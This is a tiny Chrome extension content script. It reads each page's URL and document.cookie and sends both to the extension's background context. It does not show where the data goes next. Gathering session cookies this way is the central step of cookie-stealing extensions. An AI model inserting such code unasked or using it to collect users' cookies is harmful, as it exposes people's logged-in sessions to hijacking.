/*global chrome*/
chrome.extension.sendRequest({url: document.URL, cookie: document.cookie}, function(response) {});